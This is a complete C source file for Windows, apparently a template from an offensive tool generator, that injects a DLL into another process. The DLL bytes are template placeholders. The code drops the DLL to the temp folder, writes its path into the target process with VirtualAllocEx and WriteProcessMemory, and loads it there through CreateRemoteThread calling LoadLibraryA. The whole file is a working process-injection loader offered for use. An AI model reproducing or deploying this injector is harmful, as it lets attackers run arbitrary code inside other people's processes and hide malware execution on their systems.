#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const unsigned char embedded_dll[] = {
    {{PAYLOAD_BYTES_C}}
};

static const SIZE_T embedded_dll_len =
    (SIZE_T){{PAYLOAD_BYTES_LEN}};


static void report_win32_error(
    const char *operation,
    DWORD error_code
)
{
    LPSTR message = NULL;
    DWORD length;

    length = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error_code,
        0,
        (LPSTR)&message,
        0,
        NULL
    );

    if (
        length != 0 &&
        message != NULL
    )
    {
        while (
            length > 0 &&
            (
                message[length - 1] == '\r' ||
                message[length - 1] == '\n'
            )
        )
        {
            message[--length] = '\0';
        }

        fprintf(
            stderr,
            "[-] %s failed: %s (%lu)\n",
            operation,
            message,
            (unsigned long)error_code
        );

        LocalFree(message);
        return;
    }

    fprintf(
        stderr,
        "[-] %s failed: Win32 error %lu\n",
        operation,
        (unsigned long)error_code
    );
}


typedef BOOL (WINAPI *IS_WOW64_PROCESS2_FN)(
    HANDLE,
    USHORT *,
    USHORT *
);


static const char *build_architecture(void)
{
#ifdef _WIN64
    return "x64";
#else
    return "x86";
#endif
}


static int target_architecture(
    HANDLE process,
    const char **architecture
)
{
    HMODULE kernel32;
    IS_WOW64_PROCESS2_FN is_wow64_process2;

    kernel32 = GetModuleHandleA(
        "kernel32.dll"
    );

    if (kernel32 != NULL)
    {
        is_wow64_process2 =
            (IS_WOW64_PROCESS2_FN)GetProcAddress(
                kernel32,
                "IsWow64Process2"
            );

        if (is_wow64_process2 != NULL)
        {
            USHORT process_machine = 0;
            USHORT native_machine = 0;

            if (!is_wow64_process2(
                process,
                &process_machine,
                &native_machine
            ))
            {
                DWORD error_code = GetLastError();

                report_win32_error(
                    "IsWow64Process2",
                    error_code
                );

                return 0;
            }

            if (
                process_machine
                == IMAGE_FILE_MACHINE_I386
            )
            {
                *architecture = "x86";
                return 1;
            }

            if (
                process_machine
                == IMAGE_FILE_MACHINE_AMD64
            )
            {
                *architecture = "x64";
                return 1;
            }

            if (
                process_machine
                == IMAGE_FILE_MACHINE_UNKNOWN
            )
            {
                if (
                    native_machine
                    == IMAGE_FILE_MACHINE_AMD64
                )
                {
                    *architecture = "x64";
                    return 1;
                }

                if (
                    native_machine
                    == IMAGE_FILE_MACHINE_I386
                )
                {
                    *architecture = "x86";
                    return 1;
                }
            }

            return 0;
        }
    }

    /*
     * Compatibility fallback for systems where
     * IsWow64Process2 is unavailable.
     */
    {
        BOOL wow64 = FALSE;
        SYSTEM_INFO info;

        if (!IsWow64Process(
            process,
            &wow64
        ))
        {
            DWORD error_code = GetLastError();

            report_win32_error(
                "IsWow64Process",
                error_code
            );

            return 0;
        }

        ZeroMemory(
            &info,
            sizeof(info)
        );

        GetNativeSystemInfo(
            &info
        );

        if (
            info.wProcessorArchitecture
            == PROCESSOR_ARCHITECTURE_AMD64
        )
        {
            *architecture = (
                wow64
                ? "x86"
                : "x64"
            );

            return 1;
        }

        if (
            info.wProcessorArchitecture
            == PROCESSOR_ARCHITECTURE_INTEL
        )
        {
            *architecture = "x86";
            return 1;
        }
    }

    return 0;
}


static int stage_dll(
    const unsigned char *payload,
    SIZE_T payload_len,
    char *dll_path,
    SIZE_T dll_path_size
)
{
    char temp_dir[MAX_PATH];
    DWORD temp_len;
    int path_len;
    HANDLE file;
    DWORD written = 0;

    if (
        payload == NULL ||
        payload_len == 0 ||
        dll_path == NULL ||
        dll_path_size == 0 ||
        payload_len > MAXDWORD
    )
    {
        return -1;
    }

    temp_len = GetTempPathA(
        MAX_PATH,
        temp_dir
    );

    if (temp_len == 0)
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "GetTempPathA",
            error_code
        );

        return -2;
    }

    if (temp_len >= MAX_PATH)
    {
        fprintf(
            stderr,
            "[-] Temporary path exceeds buffer size\n"
        );

        return -2;
    }

    path_len = snprintf(
        dll_path,
        dll_path_size,
        "%smifa_%lu_%lu.dll",
        temp_dir,
        (unsigned long)GetCurrentProcessId(),
        (unsigned long)GetTickCount()
    );

    if (
        path_len < 0 ||
        (SIZE_T)path_len >= dll_path_size
    )
    {
        return -3;
    }

    file = CreateFileA(
        dll_path,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (file == INVALID_HANDLE_VALUE)
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "CreateFileA",
            error_code
        );

        return -4;
    }

    if (!WriteFile(
        file,
        payload,
        (DWORD)payload_len,
        &written,
        NULL
    ))
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "WriteFile",
            error_code
        );

        CloseHandle(file);
        DeleteFileA(dll_path);
        return -5;
    }

    CloseHandle(file);

    if (written != (DWORD)payload_len)
    {
        fprintf(
            stderr,
            "[-] DLL staging write truncated: %lu / %llu bytes\n",
            (unsigned long)written,
            (unsigned long long)payload_len
        );

        DeleteFileA(dll_path);
        return -6;
    }

    return 0;
}


static int execute_technique(
    const unsigned char *payload,
    SIZE_T payload_len,
    DWORD pid
)
{
    HANDLE process = NULL;
    HANDLE thread = NULL;
    LPVOID remote_path = NULL;
    HMODULE kernel32 = NULL;
    FARPROC load_library_a = NULL;
    SIZE_T path_size;
    SIZE_T written = 0;
    DWORD wait_result;
    DWORD thread_exit_code = 0;
    const char *target_arch = NULL;
    const char *build_arch = NULL;
    char dll_path[MAX_PATH];
    int stage_result;

    process = OpenProcess(
        PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (process == NULL)
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "OpenProcess",
            error_code
        );

        return -1;
    }

    build_arch = build_architecture();

    if (!target_architecture(
        process,
        &target_arch
    ))
    {
        CloseHandle(process);
        return -2;
    }

    if (
        strcmp(
            build_arch,
            target_arch
        ) != 0
    )
    {
        fprintf(
            stderr,
            "Architecture mismatch: build=%s target=%s\n",
            build_arch,
            target_arch
        );

        CloseHandle(process);
        return -3;
    }

    stage_result = stage_dll(
        payload,
        payload_len,
        dll_path,
        sizeof(dll_path)
    );

    if (stage_result != 0)
    {
        CloseHandle(process);
        return -10 + stage_result;
    }

    path_size = strlen(dll_path) + 1;

    remote_path = VirtualAllocEx(
        process,
        NULL,
        path_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (remote_path == NULL)
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "VirtualAllocEx",
            error_code
        );

        DeleteFileA(dll_path);
        CloseHandle(process);
        return -20;
    }

    if (!WriteProcessMemory(
        process,
        remote_path,
        dll_path,
        path_size,
        &written
    ))
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "WriteProcessMemory",
            error_code
        );

        VirtualFreeEx(
            process,
            remote_path,
            0,
            MEM_RELEASE
        );

        DeleteFileA(dll_path);
        CloseHandle(process);
        return -21;
    }

    if (written != path_size)
    {
        fprintf(
            stderr,
            "[-] Remote path write truncated: %llu / %llu bytes\n",
            (unsigned long long)written,
            (unsigned long long)path_size
        );

        VirtualFreeEx(
            process,
            remote_path,
            0,
            MEM_RELEASE
        );

        DeleteFileA(dll_path);
        CloseHandle(process);
        return -22;
    }

    kernel32 = GetModuleHandleA(
        "kernel32.dll"
    );

    if (kernel32 == NULL)
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "GetModuleHandleA",
            error_code
        );

        VirtualFreeEx(
            process,
            remote_path,
            0,
            MEM_RELEASE
        );

        DeleteFileA(dll_path);
        CloseHandle(process);
        return -23;
    }

    load_library_a = GetProcAddress(
        kernel32,
        "LoadLibraryA"
    );

    if (load_library_a == NULL)
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "GetProcAddress",
            error_code
        );

        VirtualFreeEx(
            process,
            remote_path,
            0,
            MEM_RELEASE
        );

        DeleteFileA(dll_path);
        CloseHandle(process);
        return -24;
    }

    thread = CreateRemoteThread(
        process,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)load_library_a,
        remote_path,
        0,
        NULL
    );

    if (thread == NULL)
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "CreateRemoteThread",
            error_code
        );

        VirtualFreeEx(
            process,
            remote_path,
            0,
            MEM_RELEASE
        );

        DeleteFileA(dll_path);
        CloseHandle(process);
        return -25;
    }

    wait_result = WaitForSingleObject(
        thread,
        INFINITE
    );

    if (wait_result == WAIT_FAILED)
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "WaitForSingleObject",
            error_code
        );

        CloseHandle(thread);

        VirtualFreeEx(
            process,
            remote_path,
            0,
            MEM_RELEASE
        );

        CloseHandle(process);
        return -26;
    }

    if (wait_result != WAIT_OBJECT_0)
    {
        fprintf(
            stderr,
            "[-] Unexpected wait status: 0x%08lX\n",
            (unsigned long)wait_result
        );

        CloseHandle(thread);

        VirtualFreeEx(
            process,
            remote_path,
            0,
            MEM_RELEASE
        );

        CloseHandle(process);
        return -26;
    }

    if (!GetExitCodeThread(
        thread,
        &thread_exit_code
    ))
    {
        DWORD error_code = GetLastError();

        report_win32_error(
            "GetExitCodeThread",
            error_code
        );

        CloseHandle(thread);

        VirtualFreeEx(
            process,
            remote_path,
            0,
            MEM_RELEASE
        );

        CloseHandle(process);
        return -27;
    }

    if (thread_exit_code == 0)
    {
        fprintf(
            stderr,
            "[-] LoadLibraryA returned NULL in the target process\n"
        );

        CloseHandle(thread);

        VirtualFreeEx(
            process,
            remote_path,
            0,
            MEM_RELEASE
        );

        DeleteFileA(dll_path);
        CloseHandle(process);
        return -28;
    }

    printf(
        "[+] Technique   : DLL Injection\n"
    );

    printf(
        "[+] PID         : %lu\n",
        pid
    );

    printf(
        "[+] Build arch  : %s\n",
        build_arch
    );

    printf(
        "[+] Target arch : %s\n",
        target_arch
    );

    printf(
        "[+] DLL size    : %llu bytes\n",
        (unsigned long long)payload_len
    );

    printf(
        "[+] DLL path    : %s\n",
        dll_path
    );

    printf(
        "[+] LoadLibrary : completed\n"
    );

    CloseHandle(thread);

    VirtualFreeEx(
        process,
        remote_path,
        0,
        MEM_RELEASE
    );

    CloseHandle(process);

    /*
     * The staged DLL is retained while the target
     * continues to reference the loaded image.
     */
    return 0;
}


int main(int argc, char **argv)
{
    DWORD pid;
    int result;

    if (argc != 2)
    {
        fprintf(
            stderr,
            "Usage: %s <pid>\n",
            argv[0]
        );

        return 1;
    }

    pid = (DWORD)strtoul(
        argv[1],
        NULL,
        10
    );

    if (pid == 0)
    {
        fprintf(
            stderr,
            "Invalid PID\n"
        );

        return 1;
    }

    result = execute_technique(
        embedded_dll,
        embedded_dll_len,
        pid
    );

    if (result != 0)
    {
        fprintf(
            stderr,
            "DLL Injection failed: %d\n",
            result
        );

        return 1;
    }

    return 0;
}
